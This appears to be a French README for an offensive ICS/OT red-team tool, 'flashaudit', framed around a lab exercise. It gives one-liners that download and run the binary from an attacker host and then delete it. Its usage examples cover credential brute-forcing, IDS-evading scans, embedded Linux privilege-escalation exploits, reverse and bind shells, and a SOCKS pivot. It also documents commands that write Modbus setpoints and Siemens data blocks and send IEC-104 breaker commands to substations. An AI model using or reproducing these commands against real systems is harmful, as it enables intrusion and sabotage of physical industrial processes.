# flashaudit v0.2.0

Outil d'audit offensif ICS/OT pour exercices red team. Binaire statique unique,
aucune dépendance, livrable par copier-coller base64 sur Telnet.

---

## Capacités

| Module | Ce qu'il fait |
|---|---|
| **Hôte** | OS, noyau, arch, domaine, uptime, virtualisation, utilisateur, privilèges |
| **Système** | SSHD, SUID, sudoers, /etc/shadow, Defender, SMBv1, UAC, autoruns, partages |
| **Réseau** | Interfaces, ARP, ports en écoute, connexions établies, assets en relation |
| **Scan** | TCP sweep concurrent sur ~35 ports ICS/OT + infra par subnet /24 |
| **Probes ICS** | S7Comm, EtherNet/IP, Modbus FC43, BACnet — identification sans auth |
| **Honeypot** | 7 heuristiques Conpot : densité, latence, SZL, Modbus, HTTP, cross-proto |
| **Bruteforce** | SSH / Telnet / HTTP Basic — ~35 paires vendeur + matrice users×passwords |
| **Modbus** | FC03 lecture registres, FC05 écriture bobine, FC06 écriture registre |
| **S7Comm** | Lecture et écriture de blocs de données Siemens (port 102, sans auth) |
| **IEC-104** | Envoi de commandes C_SC_NA_1 vers RTU / substation |
| **LPE Linux** | CopyFail (CVE-2026-31431) et DirtyFrag (CVE-2026-43284) embarqués |
| **Pivot** | SOCKS5 no-auth, bind shell, reverse shell |
| **Rapport** | Markdown + JSON ; CRITICAL/HIGH détaillés, MEDIUM/LOW en tableau compact |

---

## Compilation

```bash
# Linux amd64 (cible principale)
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 \
  go build -ldflags="-s -w" -o flashaudit-linux-amd64 .

# Linux arm64
CGO_ENABLED=0 GOOS=linux GOARCH=arm64 \
  go build -ldflags="-s -w" -o flashaudit-linux-arm64 .

# Windows amd64
CGO_ENABLED=0 GOOS=windows GOARCH=amd64 \
  go build -ldflags="-s -w" -o flashaudit-windows-amd64.exe .
```

> Prérequis : Go ≥ 1.26, module `golang.org/x/crypto`. Les payloads LPE
> (`payloads/`) doivent exister avant la compilation Linux (le build échouera
> sinon — stub si absents).

---

## Livraison sur cible

### Option A — serveur HTTP local (recommandé)

```bash
# Lance un HTTP sur :8888 et affiche les commandes à coller sur la cible
./serve.sh
# ou sur un port différent
./serve.sh 9999
```

Commandes à coller **sur la cible** (une seule ligne) :

```bash
# Linux
wget -qO /tmp/.fa http://ATTACKER_IP:8888/flashaudit-linux-amd64 \
  && chmod +x /tmp/.fa && /tmp/.fa --scan --stdout --format=md 2>/dev/null; rm -f /tmp/.fa

# Linux (si wget absent)
curl -so /tmp/.fa http://ATTACKER_IP:8888/flashaudit-linux-amd64 \
  && chmod +x /tmp/.fa && /tmp/.fa --scan --stdout --format=md 2>/dev/null; rm -f /tmp/.fa
```

```powershell
# Windows
(New-Object Net.WebClient).DownloadFile("http://ATTACKER_IP:8888/flashaudit-windows-amd64.exe","$env:TEMP\fa.exe")
& "$env:TEMP\fa.exe" --scan --stdout --format=md
```

### Option B — hébergement public (Free.fr ou autre)

Uploader les binaires sur un hébergement accessible depuis le lab, puis :

```bash
wget -qO /tmp/.fa https://monsite.free.fr/flashaudit-linux-amd64 \
  && chmod +x /tmp/.fa && /tmp/.fa --scan --stdout --format=md 2>/dev/null; rm -f /tmp/.fa
```

### Option C — SCP (si SSH compromis en amont)

```bash
scp flashaudit-linux-amd64 user@TARGET:/tmp/.fa && ssh user@TARGET "chmod +x /tmp/.fa && /tmp/.fa --scan"
```

---

## Options

```
flashaudit [options]

Sortie
  --format=md|json|both    Format de rapport (défaut : both)
  --out=DIR                Répertoire de sortie (défaut : .)
  --stdout                 Écrire sur stdout (pas de fichier)
  --quiet                  Supprimer les messages de progression (stderr)

Collecte
  --no-system              Sauter les contrôles système
  --no-network             Sauter la cartographie réseau

Scan actif
  --scan                   TCP sweep des subnets /24 découverts
  --ranges=CIDR[,CIDR]     Ajouter des plages supplémentaires à scanner
  --stealth                Jitter 0–250 ms/hôte + concurrence réduite (50 vs 200)

Bruteforce
  --brute                  Lancer SSH/Telnet/HTTP contre les services découverts
  --brute-user=USER        Restreindre à un seul login (ex: admin)
  --brute-users=U1,U2      Restreindre à une liste de logins
  --brute-passwords=FILE   Fichier de mots de passe (1 par ligne)
  --brute-no-pairs         Désactiver le fast-track paires vendeur

Escalade (Linux uniquement)
  --escalate               Tenter CopyFail (CVE-2026-31431)
  --escalate-df            Tenter DirtyFrag (CVE-2026-43284)
  --escalate-exec=BIN      Exécuter BIN en root après succès (sinon : shell interactif)

Attaques ICS/OT
  --modbus-write=IP/ADDR/VAL        FC06 — écriture registre (ex: 192.168.10.5/40001/0)
  --s7-write=IP/DB/START/HEXDATA    Écriture bloc de données Siemens
                                    (ex: 192.168.10.10/1/0/DEADBEEF)
  --iec104=IP/ASDU/IOA/VAL          Commande C_SC_NA_1 vers RTU
                                    (ex: 192.168.10.20/1/100/1)

Pivot & shells
  --socks=ADDR             SOCKS5 no-auth (ex: 0.0.0.0:1080)
  --bind=ADDR              Bind shell TCP (ex: 0.0.0.0:4444)
  --reverse=ADDR           Reverse shell vers ADDR (ex: 10.0.0.5:4444)
```

> `--socks`, `--bind`, `--reverse` font bloquer le processus indéfiniment après
> la génération du rapport.

---

## Exemples

### 1. Audit rapide de la machine locale

```bash
./flashaudit-linux-amd64 --stdout --format=md | less
```

### 2. Cartographie complète d'un réseau ICS inconnu

```bash
# Ajouter les plages lab INL 301 + scan actif, rapport dans /tmp
./flashaudit-linux-amd64 \
  --scan \
  --ranges=192.168.10.0/24,1.2.3.0/24 \
  --out=/tmp
```

### 3. Scan furtif (évite les signatures NetFlow / IDS)

```bash
./flashaudit-linux-amd64 --scan --stealth --quiet --out=/tmp
```

### 4. Bruteforce ciblé après scan

```bash
# Sur les services découverts, avec un login fixe et une wordlist personnalisée
./flashaudit-linux-amd64 \
  --scan \
  --brute \
  --brute-user=admin \
  --brute-passwords=/tmp/rockyou-ics.txt
```

### 5. Lecture de registres Modbus (diagnostic avant attaque)

Les registres Modbus d'un automate Modicon sont exposés sur `192.168.10.5:502`.
La fonction `ModbusReadRegisters` est appelable depuis le code ; pour une lecture
rapide depuis la ligne de commande, ajouter `--modbus-read` est prévu dans la
prochaine version. En attendant, utiliser `--stdout --format=json` et corréler
avec les banners du scan.

### 6. Écriture Modbus — modifier un setpoint process

```bash
# Écrire la valeur 1337 dans le registre d'adresse 40001 (0-based : addr=0)
./flashaudit-linux-amd64 --modbus-write=192.168.10.5/0/1337
```

Le résultat (succès ou erreur Modbus exception) apparaît dans le rapport
(`CRITICAL ICS/OT — Modbus write exécuté`).

### 7. Écriture S7Comm — modifier un bloc de données Siemens

```bash
# DB1, offset 0, écrire 4 octets 0xDEADBEEF
./flashaudit-linux-amd64 --s7-write=192.168.10.10/1/0/DEADBEEF
```

### 8. Commande IEC-104 vers substation

```bash
# ASDU=1, IOA=100, valeur=1 (fermer un disjoncteur) — port 2404 par défaut
./flashaudit-linux-amd64 --iec104=192.168.10.20/1/100/1
```

### 9. Escalade de privilèges Linux

```bash
# Vérifier la vulnérabilité et lancer l'exploit (shell interactif si succès)
./flashaudit-linux-amd64 --escalate

# Ré-exécuter flashaudit en root après escalade
./flashaudit-linux-amd64 --escalate --escalate-exec=/tmp/.fa

# Variante DirtyFrag
./flashaudit-linux-amd64 --escalate-df
```

### 10. Pivot SOCKS5 + usage avec proxychains

```bash
# Sur la cible (via reverse shell ou SSH)
./flashaudit-linux-amd64 --socks=0.0.0.0:1080 --quiet

# Sur la machine attaquante
proxychains nmap -sT -p 502,102,44818 192.168.20.0/24
```

### 11. Reverse shell

```bash
# Attaquant : écoute
nc -lvnp 4444

# Cible
./flashaudit-linux-amd64 --reverse=ATTACKER_IP:4444 --quiet
```

### 12. Audit complet + pivot en une seule commande

```bash
./flashaudit-linux-amd64 \
  --scan \
  --ranges=192.168.10.0/24 \
  --brute \
  --brute-user=admin \
  --socks=0.0.0.0:1080 \
  --out=/tmp \
  --quiet
```

---

## Ports scannés

| Catégorie | Ports |
|---|---|
| ICS/OT | 102 (S7), 502 (Modbus), 2404 (IEC-104), 4840 (OPC-UA), 9600 (FINS), 20000 (DNP3), 44818 (EtherNet/IP), 47808 (BACnet), 1962, 2222, 38589 |
| Gestion | 22 (SSH), 23 (Telnet), 3389 (RDP), 5900 (VNC), 5985 (WinRM), 445, 139, 135 |
| Web | 80, 443, 8080, 8443 |
| BDD | 3306, 5432, 1433, 27017, 6379 |
| Auth | 389, 636, 88 |
| Divers | 21, 161 (SNMP), 623 (IPMI), 515 |

---

## Détection honeypot (Conpot)

Exécuté automatiquement sur tout hôte ICS découvert. Score ≥ 3 = suspect (tag
`HONEYPOT?`, sévérité rétrogradée en INFO).

| Vérification | Signal |
|---|---|
| port-density | ≥ 5 protocoles ICS simultanés → improbable sur vrai équipement |
| response-time | Latence TCP < 2 ms sur port 102/502 → VM locale |
| conpot-s7 | SZL ID=0x0011 retourne "SIMATIC 300" / "88111222" |
| conpot-modbus | FC43 retourne "Schneider Electric" + "Modicon" |
| conpot-http | HTTP titre/Server contient "Bottle", "Werkzeug", "conpot" |
| cross-proto | Même hôte revendique Siemens *et* Schneider *et* Rockwell |
| banner-generic | Port 102 ouvert sans identité S7 retournée |

---

## Rapport

Deux fichiers produits par défaut : `flashaudit_HOSTNAME_TIMESTAMP.md` et `.json`.

**Structure Markdown :**
- Synthèse (tableau CRITICAL/HIGH/MEDIUM/LOW/INFO)
- Hôte (tableau)
- Constats : CRITICAL + HIGH en blocs détaillés, MEDIUM + LOW en tableau compact
- Réseau : interfaces, ports en écoute (dédupliqués IPv4/IPv6), assets, ARP filtré
- Informations complémentaires : INFO en liste (ports éphémères, connexions publiques)

Le JSON contient l'intégralité des données (champs `scan`, `brute`, `findings`,
`network`) — utile pour post-traitement ou intégration dans un outil de reporting.

---

## Topologie INL 301 (pré-chargée)

```
--ranges=192.168.10.0/24    DMZ ICS
          1.2.3.0/24         Corporate
```

Passer les deux ranges via `--ranges=` si non détectées automatiquement depuis
les interfaces locales.

---

## Limites connues

- Bruteforce sans `--scan` et sans `--brute-target` : n'attaque que les services
  de la machine locale. Utiliser `--scan` + `--brute` ou `--brute-target`.
- La LPE est Linux uniquement ; les stubs Windows retournent INFO.
- Le reverse/bind shell est un `/bin/sh` brut — pas de PTY.
- DNP3 : probe Data Link Layer (Reset of Link) ; pas de couche application (AL).
- Modbus FC16 (write multiple registers) non implémenté — utiliser FC06 en boucle.
